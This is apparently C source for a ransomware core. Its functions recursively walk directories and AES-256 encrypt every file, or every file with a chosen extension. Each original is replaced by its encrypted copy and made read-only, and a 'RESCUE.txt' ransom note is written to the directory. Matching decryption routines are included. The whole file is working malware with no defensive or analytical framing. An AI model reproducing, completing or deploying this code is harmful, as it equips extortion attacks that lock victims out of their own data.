#include "aware.h"

#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include <sys/stat.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#define BUFFER_SIZE 4096

void
f_encrypt (const char *filename,
           const unsigned char *key)
{
  FILE *file = fopen(filename, "rb");
  if (!file)
    {
      return;
    }

  char t_filename[256];
  snprintf(t_filename, sizeof(t_filename), "%s.enc", filename);
  FILE *t_file = fopen(t_filename, "wb");
  if (!t_file)
    {
      fclose(file);
      return;
    }

  unsigned char iv[AES_BLOCK_SIZE];
  if (!RAND_bytes(iv, AES_BLOCK_SIZE))
    {
      fclose(file);
      fclose(t_file);
      return;
    }

  fwrite(iv, 1, AES_BLOCK_SIZE, t_file);

  AES_KEY Ekey;
  AES_set_encrypt_key(key, 256, &Ekey);

  unsigned char inbuf[BUFFER_SIZE];
  unsigned char outbuf[BUFFER_SIZE + AES_BLOCK_SIZE];
  int inlen;
  int outlen;

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

  while ((inlen = fread(inbuf, 1, BUFFER_SIZE, file)) > 0)
    {
      EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
      fwrite(outbuf, 1, outlen, t_file);
    }

  EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
  fwrite(outbuf, 1, outlen, t_file);

  EVP_CIPHER_CTX_free(ctx);
  fclose(file);
  fclose(t_file);

  remove(filename);
  rename(t_filename, filename);

  chmod(filename, 0400);
}

void
f_decrypt (const char *filename,
           const unsigned char *key)
{
  FILE *file = fopen(filename, "rb");
  if (!file)
    {
      return;
    }

  char t_filename[256];
  snprintf(t_filename, sizeof(t_filename), "%s.dec", filename);
  FILE *temp_file = fopen(t_filename, "wb");
  if (!temp_file)
    {
      fclose(file);
      return;
    }

  unsigned char iv[AES_BLOCK_SIZE];
  if (fread(iv, 1, AES_BLOCK_SIZE, file) != AES_BLOCK_SIZE)
    {
      fclose(file);
      fclose(temp_file);
      return;
    }

  AES_KEY Ekey;
  AES_set_decrypt_key(key, 256, &Ekey);

  unsigned char inbuf[BUFFER_SIZE + AES_BLOCK_SIZE];
  unsigned char outbuf[BUFFER_SIZE];
  int inlen;
  int outlen;

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

  while ((inlen = fread(inbuf, 1, BUFFER_SIZE, file)) > 0)
    {
      EVP_DecryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
      fwrite(outbuf, 1, outlen, temp_file);
    }

  EVP_DecryptFinal_ex(ctx, outbuf, &outlen);
  fwrite(outbuf, 1, outlen, temp_file);

  EVP_CIPHER_CTX_free(ctx);
  fclose(file);
  fclose(temp_file);

  remove(filename);
  rename(t_filename, filename);

  chmod(filename, 0400);
}

void
e_scan (const char *directory,
        const unsigned char *key)
{
  struct dirent *entry;
  DIR *dp = opendir(directory);

  if (dp == NULL)
    {
      perror("[!] Error opening the directory");
      return;
    }

  while ((entry = readdir(dp)))
    {
      char fullpath[1024];
      snprintf(fullpath, sizeof(fullpath), "%s/%s", directory, entry->d_name);

      struct stat info;
      stat(fullpath, &info);

      if (S_ISDIR(info.st_mode))
        {
          if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
            {
              e_scan(fullpath, key);
            }
        }
      else
        {
          f_encrypt(fullpath, key);
        }
    }

  closedir(dp);
}

void
d_scan (const char *directory,
        const unsigned char *key)
{
  struct dirent *entry;
  DIR *dp = opendir(directory);

  if (dp == NULL)
    {
      perror("[!] Error opening the directory");
      return;
    }

  while ((entry = readdir(dp)))
    {
      char fullpath[1024];
      snprintf(fullpath, sizeof(fullpath), "%s/%s", directory, entry->d_name);

      struct stat info;
      stat(fullpath, &info);

      if (S_ISDIR(info.st_mode))
        {
          if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
            {
              d_scan(fullpath, key);
            }
        }
      else
        {
          f_decrypt(fullpath, key);
        }
    }

  closedir(dp);
}

void
e_fex (const char *directory,
       const unsigned char *key,
       const char *f_extension)
{
  struct dirent *entry;
  DIR *dp = opendir(directory);

  if (dp == NULL)
    {
      perror("[!] Error opening the directory");
      return;
    }

  while ((entry = readdir(dp)))
    {
      char fullpath[1024];
      snprintf(fullpath, sizeof(fullpath), "%s/%s", directory, entry->d_name);

      struct stat info;
      stat(fullpath, &info);

      if (S_ISDIR(info.st_mode))
        {
          if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
            {
              e_fex(fullpath, key, f_extension);
            }
        }
      else
        {
          const char *ext = strrchr(entry->d_name, '.');
          if (ext && strcmp(ext, f_extension) == 0)
            {
              f_encrypt(fullpath, key);
            }
        }
    }

  closedir(dp);
}

void
c_note (const char *directory,
        const char *message)
{
  char note_path[1024];
  snprintf(note_path, sizeof(note_path), "%s/RESCUE.txt", directory);

  FILE *note = fopen(note_path, "w");
  if (note)
    {
      fprintf(note, "%s\n", message);
      fclose(note);
    }
  else
    {
      perror("[!] Note creation error");
    }
}
